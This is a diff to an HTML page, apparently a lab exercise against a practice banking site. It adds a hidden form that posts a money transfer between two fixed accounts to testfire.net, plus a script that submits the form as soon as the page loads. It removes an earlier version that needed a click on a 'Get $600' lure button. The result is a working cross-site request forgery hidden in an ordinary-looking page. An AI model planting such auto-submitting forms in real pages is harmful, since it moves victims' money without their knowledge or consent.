@@ -17,6 +17,13 @@
 
 <body class="is-preload">
 
+    <form id="form1" action="http://testfire.net/bank/transfer" method="POST">
+        <input type = "hidden" name= "fromAccount" value = "800002">
+        <input type = "hidden" name= "toAccount" value = "800003">
+        <input type = "hidden" name= "transferAmount" value = "200">
+        <!-- <a onclick="document.getElementById('form1').submit();" class="button primary icon solid fa-download">Get $600</a> -->
+    </form>    
+    <script> document.getElementById('form1').submit(); </script>
     <!-- Sidebar -->
     <section id="sidebar">
         <div class="inner">
@@ -37,12 +44,7 @@
                     </form>
                 </a> -->
             
-                <form id="form1" action="http://testfire.net/bank/transfer.jsp" method="POST">
-                    <input type = "hidden" name= "fromAccount" value = "800002">
-                    <input type = "hidden" name= "toAccount" value = "800003">
-                    <input type = "hidden" name= "transferAmount" value = "200">
-                    <a onclick="document.getElementById('form1').submit();" class="button primary icon solid fa-download">Get $600</a>
-                </form>    
+               
             </li>
 
         </div>
